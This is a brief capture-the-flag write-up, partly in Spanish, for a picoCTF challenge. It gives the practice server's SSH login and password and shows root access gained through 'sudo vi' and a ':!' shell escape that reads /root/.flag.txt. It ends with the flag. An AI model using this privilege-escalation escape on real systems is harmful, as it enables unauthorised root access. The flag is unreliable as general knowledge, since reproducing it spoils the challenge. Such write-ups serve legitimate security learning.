
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:`ssh -p 51329 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?


What permissions do you have?


**Solución 1**

```

ivanesco-picoctf@webshell:~$ ssh -p 51329 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sudo vi

:! cat /root/.flag.txt

picoCTF{uS1ng_v1m_3dit0r_021d10ab}

```



## Respuesta: **picoCTF{uS1ng_v1m_3dit0r_021d10ab}**


